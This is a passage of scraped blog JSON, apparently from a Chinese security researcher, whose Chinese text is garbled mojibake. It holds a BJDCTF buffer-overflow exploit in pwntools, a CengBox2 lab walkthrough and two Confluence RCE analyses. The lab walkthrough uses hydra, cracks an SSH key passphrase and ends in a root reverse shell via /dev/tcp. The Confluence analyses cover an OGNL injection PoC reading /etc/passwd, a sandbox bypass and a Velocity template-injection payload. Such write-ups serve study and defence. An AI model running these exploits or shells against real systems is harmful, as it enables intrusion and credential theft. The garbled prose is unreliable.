034455 034470 032064 033544 032071 032467 076463 077412 046105 001106 000401 000000 000000 000000 000000 001000 037000 000400 000000 000000 040006 000000 000000 040000 000000 000000 000000 014000 000033 000000 000000 000000 000000 040000 034000 004400 040000 017400 016000 003000 000000 002400 000000 040000 000000 000000 000000 040000 040000 000000 000000 040000 040000 000000 000000 174000 000001 000000 000000 174000 000001 000000 000000 004000 000000 000000 000000 001400 000000 002000 000000 034000 000002 000000 000000 034000 040002 000000 000000 034000 040002 000000 000000 016000 000000 000000 000000 016000 000000 000000 000000 000400 000000 000000 000000 000400 000000 002400 000000 000000 000000 000000 000000 000000 040000 000000 000000 000000 040000 000000 000000 132000 000013 000000 000000 132000 000013 000000 000000 000000 020000 000000 000000 000400 000000 003000 000000 010000 000016 000000 000000 010000 060016 000000 000000 010000 060016 000000 000000 054000 000002 000000 000000 060000 000002 000000 000000 000000 020000 000000 000000 001000 000000 003000 000000 024000 000016 000000 000000 024000 060016 000000 000000 024000 060016 000000 000000 150000 000001 000000 000000 150000 000001 000000 000000 004000 000000 000000 000000 002000 000000 002000 000000 052000 000002 000000 000000 052000 040002 000000 000000 052000 040002 000000 000000 042000 000000 000000 000000 042000 000000 000000 000000 002000 000000 000000 000000 050000 072345 002144 000000 104000 000012 000000 000000 104000 040012 000000 000000 104000 040012 000000 000000 032000 000000 000000 000000 032000 000000 000000 000000 002000 000000 000000 000000 050400 072345 003144 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000'e = e.split(' ')ans = ''for o in e: ans += hex(int(o,8))[2:][2:] ans += hex(int(o,8))[2:][:2]ans = ans.split('0a')[0]print(ans.decode('hex')) diffgdbé€€äº†å‡ æ¬¡å†è¿›å»çœ‹åˆ°diffé‡Œæ–‡ä»¶äºŒçš„æ ˆåœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘é¬¼ä½¿ç¥å·®çš„ä»¥ä¸ºä»–æ ˆåœ°å€æ˜¯ä¸å˜çš„ï¼Œgdbé‡Œèƒ½getshellï¼Œå‘½ä»¤è¡Œé‡Œæ‰§è¡Œå°±ä¸è¡Œã€‚ã€‚æœ‰æ²¡æœ‰å¸ˆå‚…çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆã€‚ã€‚ è¢«ææ™•äº†ï¼Œæ²¡æ³¨æ„åˆ°æ–‡ä»¶ä¸€çš„å†…å®¹ç›´æ¥å†™è¿›bssï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªgetshellï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„writeupæ‰çŸ¥é“ï¼Œå¤ªç²—å¿ƒäº†ã€‚ æ¼æ´å¤„åœ¨compareå‡½æ•°é‡Œï¼Œaddrä¹Ÿå°±æ˜¯æ–‡ä»¶äºŒè¯»å–æ²¡æœ‰é™åˆ¶é•¿åº¦ï¼Œè¶…è¿‡0x78å­—èŠ‚å°±ä¼šæº¢å‡ºï¼Œè€Œbuf1æ˜¯è¯»åˆ°bssé‡Œçš„ï¼Œæœ‰å› ä¸ºæ²¡æœ‰å¼€NXï¼Œå¯ä»¥ç›´æ¥æ§åˆ¶ç¨‹åºè·³åˆ°buf1å¤„æ‰§è¡Œshellcodeã€‚ 1234567891011121314151617181920int __cdecl compare(int a1, int fd){ char v2; // al int v4; // [esp+0h] [ebp-80h] unsigned int i; // [esp+4h] [ebp-7Ch] char addr[120]; // [esp+8h] [ebp-78h] v4 = 0; JUMPOUT(sys_read(fd, buf1, 0x80u), 0, &amp;failed); JUMPOUT(sys_read(a1, addr, 0x80u), 0, &amp;failed); for ( i = 0; addr[i] + buf1[i] &amp;&amp; i &lt; 0x400; ++i ) { v2 = buf1[i]; if ( v2 != addr[i] ) return v4 + 1; if ( v2 == 10 ) ++v4; } return 0;} é™„ä¸Šexp 123456789101112131415161718192021222324252627from pwn import *import base64buf = 0x0804A024shellcode = asm(shellcraft.sh())payload = flat(cyclic(124),buf)context.log_level = 'DEBUG'context.binary = './diff'if sys.argv[1] == 'l': p = process(argv=['diff','/tmp/123','/tmp/456'],executable='./diff') f1 = open('/tmp/123','wb') f2 = open('/tmp/456','wb') f1.write(shellcode) f2.write(payload) f1.close() f2.close()else: pwn_ssh = ssh(host='node3.buuoj.cn',user='ctf',password='guest',port=26462) p = pwn_ssh.process('/bin/bash') p.sendline('echo {} | base64 -d &gt; /tmp/123;echo {} | base64 -d &gt; /tmp/456'.format(base64.b64encode(shellcode),base64.b64encode(payload))) p.close() p = pwn_ssh.process(argv=['diff','/tmp/123','/tmp/456'],executable='./diff')elf = ELF('./diff')p.interactive()","link":"/2020/03/25/BJDCTF_writeup/"},{"title":"CengBox2 walkthrought","text":"å‰è¨€è¿™å›æ¥åšä¸ªä¸­ç­‰éš¾åº¦çš„é¶æœºCengBox2ï¼Œåˆå­¦åˆ°äº†å¾ˆå¤šæ–°çŸ¥è¯†ï¼Œè¿™ä¸ªé¶æœºè¿˜æ˜¯è®¾è®¡å¾—æŒºå¥½ã€æŒºå·§å¦™çš„ã€‚ https://www.vulnhub.com/entry/cengbox-2,486/ åˆ©ç”¨è¿‡ç¨‹ä½¿ç”¨nmapæ‰«æå‡º21ï¼Œ22å’Œ80ç«¯å£ã€‚ 1nmap -sV -T 4 -p- 192.168.100.102 æ‰“å¼€ç½‘é¡µè¯´ç½‘ç«™å·²ä¸æä¾›æœåŠ¡ï¼Œä¾‹è¡Œæ‰«ç›®å½•ä¹Ÿæ˜¯æ²¡æ‰«åˆ°æ‰«æä¸œè¥¿ã€‚ åˆ©ç”¨hydraçˆ†ç ´ä¸‹rootã€cengã€ftpè¿™å‡ ä¸ªè´¦å·çš„ftpå¯†ç ï¼Œå…¶ä¸­è´¦å·ftpè¢«çˆ†ç ´å‡ºæ¥äº†ï¼Œè€Œä¸”æ˜¯å¥½å‡ ä¸ªå¯†ç ï¼ï¼åé¢è¯•äº†ä¸‹å…¶å®æ˜¯æ²¡è®¾å¯†ç ï¼Œç›´æ¥èƒ½ç™»å½•ã€‚ 1hydra -P /usr/share/wordlists/fasttrack.txt -L userlist.txt ftp://192.168.100.102 ç™»å½•è¿›å»æœ‰ä¸€åˆ™ç•™è¨€ï¼Œè¯´åœ¨ä¸€ä¸ªæ–°çš„åŸŸåceng-company.vmé‡Œè®¾ç½®äº†ä¸€ä¸ªé¢æ¿ï¼Œå¹¶ä¸ºKevinåˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œå¯†ç ä¸ºé»˜è®¤å¯†ç ï¼Œé‚£å°±æ˜¯å¼±å£ä»¤å’¯ :D Hey Kevin,I just set up your panel and used default password. Please change them before any hack. I try to move site to new domain which name is ceng-company.vm and also I created a new area for you. Aaron å½“æˆ‘æ”¹/etc/hostsä»¤ceng-company.vmè§£æä¸º192.168.100.102ï¼Œé‡æ–°å›åˆ°é¡µé¢ï¼Œå®ƒè¿˜æ˜¯åŸæ¥çš„æ ·å­ã€‚ å»å·ç„äº†ä¸‹åˆ«äººçš„walkthroughï¼Œç½‘ç«™åŸæ¥æ˜¯åœ¨å­åŸŸåé‡Œã€‚ç”±äºå¸¸ç”¨çš„ä¸€äº›å­åŸŸåçˆ†ç ´å·¥å…·éƒ½æ˜¯å±…äºDNSçš„ï¼Œåœ¨è¿™é‡Œè‚¯å®šæ˜¯æ²¡æ³•ç”¨çš„ï¼Œæ‰€ä»¥ç›´æ¥æŠŠå­—å…¸å¯¼å…¥åˆ°burpsuiteé‡Œï¼Œæ”¹Hostçˆ†ç ´å³å¯ã€‚ çˆ†ç ´åˆ°adminæ—¶å¯ç”¨çœ‹è§è¿”å›çš„çŠ¶æ€ç å’Œé•¿åº¦éƒ½è·Ÿåˆ«çš„ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šæ­£ç¡®çš„å­åŸŸåå°±æ˜¯è¿™ä¸ªäº†ã€‚ å†åœ¨/etc/hostsé‡ŒåŠ ä¸€æ¡admin.cencompany.vmè§£æåˆ°192.168.100.102ã€‚æ¥ä¸‹æ¥ä¾æ—§è¦çˆ†ç ´ç›®å½•ï¼Œä¸€å¼€å§‹ä½¿ç”¨é»˜è®¤çš„å­—å…¸æ²¡çˆ†ç ´å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œåæ¥æ¢æˆdirbursterçš„å¤§å­—å…¸å°±å¯ä»¥äº†ã€‚è¿™é‡Œæˆ‘ç”¨çš„æ˜¯dirseachæ¥çˆ†ç ´ã€‚ 1python3 dirsearch.py -u http://admin.ceng-company.vm/ -e all -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 ç½‘ç«™æ˜¯Gila CMSï¼Œæœåˆ°äº†ä¸¤ä¸ªæœ‰ç‚¹ç”¨çš„æ´ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«å’Œæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€‚ åå°ä¸ºadminï¼Œç”¨æˆ·åæç¤ºä¸ºé‚®ç®±ï¼Œé‚£å°±ç”¨kevin@ceng-company.vmã€‚ç”¨burpsuiteçˆ†ç ´ï¼Œæ²¡ä¸€ä¼šå°±ç»™banäº†ã€‚ äºæ˜¯æ‰‹åŠ¨çˆ†ç ´ï¼Œæµ‹åˆ°adminå°±è¿›å…¥åˆ°åå°ã€‚è¿›åˆ°åå°å‘ç°ä¸ç”¨æœåˆ°çš„æ¼æ´ä¹Ÿè¡Œï¼Œå› ä¸ºæœ‰æ–‡ä»¶ç®¡ç†åŠŸèƒ½ï¼Œç›´æ¥æ’å…¥ä¸€å¥è¯å³å¯ã€‚ åå¼¹ä¸€ä¸ªshellï¼Œç”¨Privilege Escalation Awesome Scripts SUITEæ‰«æäº†ä¸‹å¯èƒ½å¯ä»¥ææƒçš„ç‚¹ã€‚å‘ç°www-dataå¯ä»¥æ— éœ€å¯†ç ï¼Œä»¥swartzçš„èº«ä»½è¿è¡Œ/home/swartz/runphp.shã€‚ 123#!/bin/bashphp -a è¿è¡Œè¿™ä¸ªè„šæœ¬å¯äº¤äº’åœ°è¾“å…¥phpä»£ç ï¼Œé‚£å³å¯å¼¹å‡ºswartzçš„shellã€‚ç”±äºåå¼¹çš„shellæ˜¾ç¤ºphpçš„äº¤äº’ç•Œé¢ä¸æ­£å¸¸ï¼Œå¯ä»¥ç”¨python3å¼¹å‡ºä¸ªå®Œæ•´çš„shellã€‚ 12python3 -c \"import pty;pty.spawn('/bin/bash')\"sudo -u swartz /home/swartz/runphp.sh ç°åœ¨å°±æ˜¾ç¤ºæ­£å¸¸äº†ã€‚ å†è¾“å…¥system(&quot;/bin/bash&quot;);å¼¹å‡ºswartzçš„shellï¼Œç”¨ææƒè„šæœ¬é‡æ–°æ‰«æä¸‹ï¼Œå‘ç°swartzå¯ä»¥è¯»mitnickç”¨æˆ·ç›®å½•ä¸‹çš„sshç§é’¥ã€‚ æŠŠç§é’¥ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨ç§é’¥è¿æ¥sshæ—¶ï¼Œå‘ç°æ˜¯éœ€è¦passphraseçš„ã€‚ johnå¯ä»¥ç ´è§£passphraseï¼Œå…ˆæŠŠsshç§é’¥è½¬ä¸ºjohnå¯è¯†åˆ«çš„æ ¼å¼ï¼Œå†è¿›è¡Œçˆ†ç ´ã€‚ 12/usr/share/john/ssh2john.py /tmp/rsa &gt; /tmp/tmpjohn --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tmp ç”¨å¯†ç legendï¼Œç™»å½•åˆ°mitnickï¼Œcat ~/user.txtæ‹¿åˆ°homeç›®å½•ä¸‹çš„flagã€‚ é™¤äº†æ— éœ€å¯†ç sudo -uå¤–ï¼Œæ‰«æè¿˜å‘ç°äº†/etc/update-motd.dç›®å½•ä¸‹çš„è„šæœ¬å¯å†™ã€‚è¿™ä¸‹è„šæœ¬æ˜¯å±äºrootçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯å½“æœ‰ç”¨æˆ·é€šè¿‡sshç™»å½•æ—¶ä¼šä»¥rootæƒé™è‡ªåŠ¨è¿è¡Œï¼Œè¿è¡Œç»“æœå°±æ˜¯æˆ‘ä»¬sshç™»å½•æ—¶çœ‹åˆ°çš„æ¬¢è¿ä¿¡æ¯ã€‚ åœ¨å…¶ä¸­ä¸€ä¸ªè„šæœ¬é‡Œæ’å…¥ä¸ªåå¼¹shellï¼Œé€€å‡ºå¹¶é‡æ–°ç™»å½•sshï¼ŒæˆåŠŸåå¼¹rootçš„shellå›æ¥ã€‚ 1/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.100.101/4444 0&gt;&amp;1\" å‚è€ƒCengBox 2 Vulnhub Walkthrough","link":"/2020/06/13/CengBox2_walkthrough/"},{"title":"Confluence OGNLè¡¨è¾¾å¼æ³¨å…¥åˆ†æï¼ˆCVE-2022-26134ï¼‰","text":"å‰è¨€ Atlassian Confluenceæ˜¯ä¼ä¸šå¹¿æ³›ä½¿ç”¨çš„wikiç³»ç»Ÿã€‚2022å¹´6æœˆ2æ—¥Atlassianå®˜æ–¹å‘å¸ƒäº†ä¸€åˆ™å®‰å…¨æ›´æ–°ï¼Œ Confluenceä¸Šå­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚OGNLæ³¨å…¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·åœ¨Confluence Serveræˆ–Data Centerå®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´åˆ†æåœ¨Runtimeå¤„ä¸‹æ–­ç‚¹ï¼Œå¼€å¤´ç»è¿‡ä¸€è¿ä¸²çš„FilterChainï¼Œä½†Filteréƒ½æ­£å¸¸æ‰§è¡Œå®Œäº†ï¼Œæ˜¾ç„¶æ¼æ´ä¸Filteræ— å…³ã€‚ç›´æ¥è·Ÿè¿›åˆ°com.atlassian.confluence.servlet.ConfluenceServletDispatcherçˆ¶ç±»çš„serviceæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå¼€å§‹å¤„ç†Servletçš„è¯·æ±‚ã€‚ 12345678910111213141516171819202122exec:443, Runtime (java.lang)...getValue:333, Ognl (ognl)getValue:310, Ognl (ognl)findValue:141, OgnlValueStack (com.opensymphony.xwork.util)translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)execute:95, ActionChainResult (com.opensymphony.xwork)executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)invoke:187, DefaultActionInvocation (com.opensymphony.xwork)intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)invoke:165, DefaultActionInvocation (com.opensymphony.xwork)...execute:115, DefaultActionProxy (com.opensymphony.xwork)serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)service:764, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilter:53, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)...doFilter:162, ApplicationFilterChain (org.apache.catalina.core) ç„¶ååœ¨æ‰§è¡Œä¸€ç³»åˆ—çš„Interceptoråï¼Œæ¥åˆ°äº†ConfluenceAccessInterceptorï¼ŒéªŒè¯æ˜¯å¦æœ‰æƒé™è®¿é—®ã€‚æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•ï¼Œæ‰€ä»¥é¦–æ¬¡è®¾ç½®äº†è¿”å›é¡µé¢çŠ¶æ€notpermittedï¼Œä¸”æ²¡æœ‰ç»§ç»­é€’å½’åˆ°ä¸‹ä¸€ä¸ªInterceptorã€‚ ç”±äºæ²¡æœ‰ç»§ç»­é€’å½’Interceptorï¼Œä¸”æ²¡æœ‰è¿˜æœªæ‰§è¡Œç›¸åº”çš„Actionï¼Œæ‰€ä»¥ä¸¾è¡Œæ‰§è¡Œinvokeæ–¹æ³•çš„åç»­ä»£ç ï¼Œè¿›å…¥åˆ°com.opensymphony.xwork.DefaultActionInvocation#executeResultæ–¹æ³•ã€‚ è·Ÿè¿›åˆ°executeResultæ–¹æ³•ï¼Œé¦–å…ˆä¼šæ‰§è¡Œæœ¬ç±»ä¸­çš„createResultæ–¹æ³•ï¼Œå†æ¬¡è·Ÿè¿›ã€‚ä»£ç çš„é€»è¾‘æ˜¯æ ¹æ®é¡µé¢çš„çŠ¶æ€è¿”å›ç›¸åº”çš„Resultç±»å‹ã€‚ å½“å‰çš„çŠ¶æ€æ˜¯notpermittedï¼Œæ‰€ä»¥è¿”å›çš„Resultå°±æ˜¯com.opensymphony.xwork.ActionChainResultã€‚é—®é¢˜ä¹Ÿå‡ºåœ¨ActionChainResultè¿™é‡Œï¼Œå®ƒçš„executeä¼šè¢«DefaultActionInvocationçš„executeResultæ–¹æ³•è°ƒç”¨ã€‚å…¶ä¸­ä¼šç”¨com.opensymphony.xwork.util.TextParseUtil#translateVariablesæ–¹æ³•ï¼Œä»¥OGNLè¡¨è¾¾å¼æ–¹å¼è§£ænamespaceï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å¯æ§çš„è·¯å¾„ï¼Œå¯¼è‡´äº†OGNLè¡¨è¾¾å¼æ³¨å…¥ã€‚ æœ€åçš„POCå°±æ˜¯OGNLè¡¨è¾¾å¼æ³¨å…¥çš„POCäº†ï¼Œæ¯”å¦‚ä»¥ä¸‹å¹¿ä¸ºæµä¼ çš„å›æ˜¾POCï¼š 1/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))} æ²™ç®±ç»•è¿‡çœ‹åˆ°æœ‰æ–‡ç« è¯´ç¨é«˜çš„ç‰ˆæœ¬åŠ å…¥äº†OGNLçš„æ²™ç®±ï¼Œä¸‹è½½äº†ä¸ªæµ‹è¯•äº†ç¡®å®å¦‚æ­¤ã€‚åœ¨OgnlValueStackçš„findValueæ–¹æ³•è°ƒç”¨äº†isSafeExpressionæ–¹æ³•åšè¡¨è¾¾å¼çš„éªŒè¯ã€‚éªŒè¯çš„ä¸»è¦é€»è¾‘åœ¨com.opensymphony.xwork.util.SafeExpressionUtil#containsUnsafeExpressionæ–¹æ³•ã€‚ 12345678910111213141516171819202122232425private boolean containsUnsafeExpression(Node node, Set&lt;String&gt; visitedExpressions) { String nodeClassName = node.getClass().getName(); if (UNSAFE_NODE_TYPES.contains(nodeClassName)) { // 0 = \"ognl.ASTStaticField\" 1 = \"ognl.ASTCtor\" 2 = \"ognl.ASTAssign\" return true; } else if (\"ognl.ASTStaticMethod\".equals(nodeClassName) &amp;&amp; !this.allowedClassNames.contains(getClassNameFromStaticMethod(node))) { return true; } else if (\"ognl.ASTProperty\".equals(nodeClassName) &amp;&amp; this.isUnSafeClass(node.toString())) { return true; } else if (\"ognl.ASTMethod\".equals(nodeClassName) &amp;&amp; this.unsafeMethodNames.contains(getMethodInOgnlExp(node))) { return true; } else if (\"ognl.ASTVarRef\".equals(nodeClassName) &amp;&amp; UNSAFE_VARIABLE_NAMES.contains(node.toString())) { return true; } else if (\"ognl.ASTConst\".equals(nodeClassName) &amp;&amp; !this.isSafeConstantExpressionNode(node, visitedExpressions)) { return true; } else { for(int i = 0; i &lt; node.jjtGetNumChildren(); ++i) { Node childNode = node.jjtGetChild(i); if (childNode != null &amp;&amp; this.containsUnsafeExpression(childNode, visitedExpressions)) { return true; } } return false; }} è¯¥æ–¹æ³•ç¦æ­¢äº†é™æ€å±æ€§ã€æ„é€ æ–¹æ³•ï¼Œå’Œå¯¹å±æ€§ã€æ–¹æ³•ã€OGNLå˜é‡ã€å¸¸é‡è¿›è¡Œé»‘åå•éªŒè¯ï¼Œå¯¹é™æ€æ–¹æ³•è¿›è¡Œç™½åå•éªŒè¯ã€‚ å…ˆçœ‹çœ‹OGNLå˜é‡çš„é»‘åå•ï¼ŒæŠŠå½“å‰æ‰€æœ‰çš„ä¸å¸¦.å·çš„ä¸Šä¸‹æ–‡å˜é‡éƒ½è¿‡æ»¤äº†ï¼›è€Œå¸¦.å·å˜é‡ï¼Œ.å·çš„å†…å®¹åˆè¢«è§£æä¸ºå±æ€§ï¼Œæ²¡æ³•æ­£ç¡®è·å–åˆ°å˜é‡ã€‚æ‰€ä»¥@pwntesterå¤§ä½¬çš„ä¸Šä¸‹æ–‡å¤§æ³•åœ¨æˆ‘è¿™é‡Œæ‰ç–å­¦æµ…æ²¡æ³•ç»•äº†ï¼Œä¹Ÿè®¸æœ‰åˆ«çš„ä¸€ç§å†™æ³•ï¼Œå¸Œæœ›ç ”ç©¶å‡ºæ¥çš„å¸ˆå‚…åˆ†äº«åˆ†äº«ã€‚ ä½†ç°åœ¨æœ‰ä¸€ä¸ª@Pç‰›å…¬å¼€çš„ç»•æ²™ç®±POCï¼Œå½¢å¦‚${Class.forName(&quot;xxxxxxx&quot;)}ã€‚æˆ‘ä»¬å›çœ‹å±æ€§é»‘åå•æ˜¯æœ‰classçš„ï¼Œé‚£ä¸ºä»€ä¹ˆPç‰›çš„POCå†…è·å–åˆ°ç±»å®ä¾‹å‘¢ï¼Ÿè¿™å°±æ¶‰åŠåµŒå¥—å±æ€§çš„é—®é¢˜ï¼Œå½“ä¸€ä¸ªç±»æœ‰getXXXæ–¹æ³•æ—¶ï¼ŒXXXå°±æ˜¯å®ƒçš„åµŒå¥—å±æ€§ï¼Œèƒ½é€šè¿‡.ç‚¹å·çš„æ–¹å¼è·å–ã€‚è¿™ä¸ªå°trickå¸¸åœ¨è¡¨è¾¾å¼è¯­è¨€ä¸­ç”¨åˆ°ï¼Œç›¸å…³çš„ç”¨æ³•æœ‰å¦‚Springçš„CVE-2022-22965ã€‚ åé¢çš„åˆ©ç”¨å¯ä»¥ç”¨ç»å…¸çš„ScriptEngineManagerï¼Œä¹Ÿå¯ä»¥åå°„Runtimeï¼Œä½†åœ¨é»‘åå•ä¸­çš„ç±»åè¦æ‹¼æ¥ä»¥ä¸‹ï¼Œç®€å•ç»•ä¸‹æ²™ç®±ä¸­çš„å…³é”®å­—ã€‚ åè®°ç®€å•çœ‹ä¸‹å®˜æ–¹å‘å¸ƒçš„è¡¥ä¸ï¼Œæ„Ÿè§‰httpmethodnotallowedå’Œinviladmethodä¸¤ç§é¡µé¢çŠ¶æ€è¿˜èƒ½åˆ©ç”¨ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆè§¦å‘ğŸ˜… å‚è€ƒhttps://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134 https://twitter.com/phithon_xg/status/1532887542722269184","link":"/2022/06/08/Confluence OGNLè¡¨è¾¾å¼æ³¨å…¥åˆ†æï¼ˆCVE-2022-26134ï¼‰/"},{"title":"Confluenceæ¨¡æ¿æ³¨å…¥ï¼ˆCVE-2020-4027ï¼‰å¤ç°","text":"å‰è¨€å‰æ®µæ—¶é—´ï¼Œæ¶›å“¥å®‰æ’äº†ä¸ªConfluenceç«™ç‚¹çš„æµ‹è¯•ï¼Œç½‘ä¸Šæœäº†ä¸‹å­˜åœ¨æ¨¡æ¿æ³¨å…¥å¯å¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œç¼–å·CVE-2020-4027ã€‚ç½‘ä¸Šæ²¡æœ‰å¤ç°çš„æ–‡ç« ï¼Œç›´åˆ°è¦äº¤æŠ¥å‘Šäº†è¿˜æ˜¯æ²¡æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œåªèƒ½äº¤ä¸ªæ¨¡æ¿æ³¨å…¥å¯¼è‡´æ–‡ä»¶è¯»å–æ‚»æ‚»è€Œå½’ã€‚è¿™ä»¶äº‹å¦‚é² åœ¨å–‰ï¼Œäºæ˜¯æŠ½ç©ºæ­ä¸ªç¯å¢ƒå¤ç°äº†ä¸‹ã€‚ å‰æœŸå‡†å¤‡å¤ç°ç¯å¢ƒæœ¬æ–‡ä½¿ç”¨çš„æ˜¯Confluence 7.4.4çš„ç‰ˆæœ¬ï¼Œå®˜ç½‘æœ‰éƒ¨ç½²åŒ…å¯ä¸‹ï¼Œè€ƒè™‘åˆ°è¦ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œæ²¡æœ‰ä½¿ç”¨Dockeréƒ¨ç½²ï¼Œæ•°æ®åº“å¯ä»¥ä½¿ç”¨Dockerèµ·ä¸€ä¸ªpostgresï¼Œé…ç½®æ­¥éª¤ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œæœ¬æ–‡å°±ä¸å…·å™ã€‚ å‰æœŸå‡†å¤‡ä¸»è¦æ˜¯IDEAæ€ä¹ˆå»è°ƒè¯•çš„é—®é¢˜ã€‚å¼€å¤´å°±é‡åˆ°å‘ï¼ŒXloggcçš„æ—¥å¿—æ–‡ä»¶ä¸æ”¯æŒä¸­æ–‡ï¼Œç¯å¢ƒç›´æ¥éƒ½å¯åŠ¨ä¸èµ·æ¥ï¼Œæœ€åæ’æŸ¥ä¸‹åœ¨service.baté‡Œæœ‰Xloggcæ–‡ä»¶åå‚æ•°ï¼Œç³»ç»Ÿæ˜¯ä¸­æ–‡çš„æ–‡ä»¶åä¹Ÿä¼šæ˜¯ä¸­æ–‡ï¼Œåˆ é™¤æ‰ç™¾åˆ†å·çš„å†…å®¹å³å¯ã€‚éƒ¨ç½²åŒ…è‡ªå¸¦ä¸€ä¸ªtomcatï¼ŒåŒ…é‡Œçš„confluenceç›®å½•æ˜¯é¡¹ç›®çš„Webç›®å½•ï¼Œåˆšå¼€å§‹æƒ³ç€ä»IDEAé‡Œå¯åŠ¨tomcatï¼Œä½†ä¸è¿‡æ˜¯è‡ªå¸¦çš„tomcatï¼Œè¿˜æ˜¯è‡ªå·±çš„tomcatå¯åŠ¨åè®¿é—®éƒ½æ˜¯404ã€‚æœ€åå­¦ç€è¿œç¨‹è°ƒè¯•çš„æ–¹æ³•ï¼Œåœ¨è‡ªå¸¦tomcatçš„catalina.batè„šæœ¬å¼€å¤´åŠ å…¥ä»¥ä¸‹ä¸€è¡Œè°ƒè¯•å‘½ä»¤ï¼Œæ¥ç€è¿è¡Œå¯åŠ¨æ–‡ä»¶start-confluence.batï¼Œå¹¶å¼€å¯è°ƒè¯•å³å¯ã€‚ å¤ç°æ­¥éª¤è™½ç„¶ç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°å…·ä½“çš„æ¼æ´ç‚¹ï¼Œä½†æ ¹æ®CVEçš„æè¿°å’Œ@Xiao_Cå¸ˆå‚…çš„å¤ç°æˆªå›¾å¯å¾—çŸ¥æ¼æ´ç‚¹æ˜¯å‡ºåœ¨ç”¨æˆ·å®(User macros)é‡Œï¼Œå†æŸ¥é˜…ä¸‹æ–‡æ¡£å’Œæ ¹æ®ä¸Šä¸€ä¸ªæ¨¡æ¿æ³¨å…¥æ¼æ´CVE-2019-3396å¯çŸ¥ï¼Œç”¨æˆ·å®å¯é€šè¿‡ç®¡ç†å‘˜çš„ä¸€èˆ¬è®¾ç½®çš„ç”¨æˆ·å®å¤„è®¾ç½®ï¼Œç„¶ååœ¨ç¼–è¾‘æ–‡ç« çš„å…¶ä»–å®é‡Œé¢„è§ˆè§¦å‘ã€‚ ç”¨CVE-2019-3396çš„payloadå¦‚ä¸‹ï¼Œè¯•äº†ä¸‹æ— æ³•æ‰§è¡Œå‘½ä»¤ç›´æ¥è¾“å‡ºäº†æ¨¡æ¿çš„å†…å®¹ï¼Œæ ¹æ®CVEçš„æè¿°å¾—çŸ¥æ˜¯å› ä¸ºä½¿ç”¨äº†æ²™ç®±å¯¼è‡´çš„ã€‚ 123456789#set($e=&quot;exp&quot;)#set($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))#set($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))#set($sc=$e.getClass().forName(&quot;java.util.Scanner&quot;))#set($constructor=$sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\\\A&quot;))#if($scan.hasNext()) $scan.next()#end é‚£ä¹ˆå…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„velocity demoå¦‚ä¸‹ï¼Œæœ€åŸºæœ¬çš„ä¼šå®ä¾‹åŒ–æ¨¡æ¿å¼•æ“VelocityEngineå’Œæ¨¡æ¿ä¸Šä¸‹æ–‡VelocityContextã€‚ 123456789101112public static void main(String[] args) throws Exception { Properties p = new Properties(); VelocityEngine velocity = new VelocityEngine(); velocity.init(p); Template template = velocity.getTemplate(\"test.vm\", \"utf-8\"); VelocityContext context = new VelocityContext(); StringWriter writer = new StringWriter(); template.merge(context, writer); writer.flush(); System.out.println(writer.toString());} 